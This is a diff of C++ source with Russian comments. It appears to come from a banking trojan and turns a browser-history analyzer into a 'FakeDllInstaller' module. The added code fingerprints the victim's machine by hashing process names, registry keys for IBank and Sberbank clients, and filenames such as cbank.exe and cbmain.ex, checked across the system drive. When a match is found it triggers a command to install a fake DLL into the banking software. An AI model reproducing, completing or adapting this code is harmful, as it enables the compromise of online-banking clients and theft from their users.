@@ -2,7 +2,7 @@
 
 #include "Modules.h"
 
-#ifdef HistoryAnalizerH
+#ifdef FakeDllInstallerH
 //=============================================================================
 
 
@@ -18,7 +18,8 @@
 #include "Utils.h"
 #include "Task.h"
 #include "StrConsts.h"
-#include "HistoryAnalizer.h"
+#include "FakeDllInstaller.h"
+#include "Utils.h"
 
 
 
@@ -573,13 +574,11 @@ void HisAnalizer::StartAnalizerThread(PCHAR URL)
 */
 
 //*****************************************************************************
-//   Методы анализа истории навигации
+//   Методы поиска следов на компьютере с целью проверки необходимости
+//   установки Fake DLL
 //*****************************************************************************
-namespace HisAnalizer
+namespace FKI
 {
-
-
-
 	//--------------------------------------------------
 	//  Функция загружает список обрабатываемых ссылок
 	//--------------------------------------------------
@@ -623,8 +622,6 @@ namespace HisAnalizer
 					break;
 				}
 			}
-
-
 			MemFree(Buf);
         }
 	}
@@ -655,34 +652,152 @@ namespace HisAnalizer
 
 		return false;
     }
+	//-------------------------------------------------------------------------
+
+	bool CheckFileHash(DWORD Hash)
+	{
+		// Функция сравнивает хэш имени файла с именами прописанными в массиве
+		const static DWORD Hashes[] ={0xD61CFB13, /* cbank.exe */
+									  0xFE0E05F6, /* cbmain.ex */
+									  0x702FB20,  /* cbmain.ex_ */
+									  0};
+		int i = 0;
+		while (Hashes[i])
+		{
+			if (Hash == Hashes[i])
+				return true;
+			i++;
+		}
+		return false;
+	}
+	//-------------------------------------------------------------------------
+
+	bool SearchProcesses()
+	{
+		// Функция проверяет запущенные процессы в поиске нужных
+
+		bool Result = false;
+		LPVOID Buf = GetInfoTable( SystemProcessInformation );
+		PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)Buf;
+
+		DWORD dwSessionId = 0;
+
+		if (pProcess != NULL)
+		{
+			dwSessionId = GetCurrentSessionId();
+
+			do
+			{
+				if ( dwSessionId == pProcess->uSessionId )
+				{
+					if ( pProcess->usName.Length )
+					{
+						DWORD ProcessHash = STRW::Hash(pProcess->usName.Buffer, 0, true);
+
+						if (CheckFileHash(ProcessHash))
+						{
+							Result = true;
+							break;
+						}
+					}
+				}
+
+				pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext);
+
+			} while ( pProcess->uNext != 0 );
+		}
+
+		MemFree(Buf);
+
+		return Result;
+	}
+    //-------------------------------------------------------------------------
 
 
+	bool IBankInstalled()
+	{
+		// Функция проверяет наличие ключей реестра
+		//  сигнализирующих об установленном,
+		// на машине пользователя IBank
+		string Tmp = GetStr(EStrSberRegistryKey);
+
+		bool Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
+					  Registry::IsKeyExist(HKEY_LOCAL_MACHINE, Tmp.t_str()) ||
+					  Registry::IsKeyExist(HKEY_CURRENT_USER,  Tmp.t_str());
+
+		return Result;
+
+	}
+	//-------------------------------------------------------------------------
+
+	void CheckFile(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
+	{
+		// Проверяем файл
+		DWORD Hash = STRA::Hash(Find->cFileName, 0, true);
+		if (CheckFileHash(Hash))
+		{
+			Cancel = true;
+            *((bool*)SearchData) = true;
+		}
+		pSleep(1);
+	}
+    //-------------------------------------------------------------------------
+
+	bool CheckFiles()
+	{
+		// Функция ищет вхождение нужных файлов
+		TMemory Path(MAX_PATH);
+
+		pGetSystemDirectoryA(Path.AsStr(), MAX_PATH);
+		PCHAR S = Path.AsStr();
+		PCHAR End = STRA::Scan(S, '\\');
+		if (End) *(End + 1) = 0;
+
+		bool Result = false;
+
+		SearchFiles(S, "*.*", true, FA_ANY_FILES, &Result, CheckFile);
+
+		return Result;
+	}
 
 	//--------------------------------------------------
 	//  Функция потока анализа истории навигации
 	//--------------------------------------------------
 	DWORD WINAPI DoExecute(LPVOID)
 	{
-		TBotStrings Links;
+		// В данны момент в эту часть вставляем проверку
+		// ключей реестра сигнализирующих об установленном,
+		// на машине пользователя IBank
 
-		// Читаем ссылки
-		ReadLinks(Links);
+		bool Executed = IBankInstalled() ||
+						SearchProcesses() ||
+						CheckFiles();
 
-		// Анализируем историю навигации
-		bool Executed = CheckIEHistory(Links);
+
+
+		if (!Executed)
+		{
+			TBotStrings Links;
+
+			// Читаем ссылки
+			ReadLinks(Links);
+
+			// Анализируем историю навигации
+			Executed = CheckIEHistory(Links);
+        }
 
 		// В случае обнаружения вхождений, выполняем команду
 		if (Executed)
 		{
 			#ifndef AGENTFULLTEST
 				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(),
-									 GetStr(StrHistoryAnalizerCommandParams).t_str(), false);
+									 GetStr(EStrHistoryAnalizerCommandParams).t_str(), false);
 			#endif
         }
 
 		return 0;
 	}
-
+    //-------------------------------------------------------------------------
 }
 
 
@@ -691,7 +806,7 @@ namespace HisAnalizer
 //------------------------------------------------------
 // Execute - Фуекция запускает анализ истории навигации
 //------------------------------------------------------
-void HisAnalizer::Execute()
+void FKI::Execute()
 {
 	StartThread(DoExecute, 0);
 }
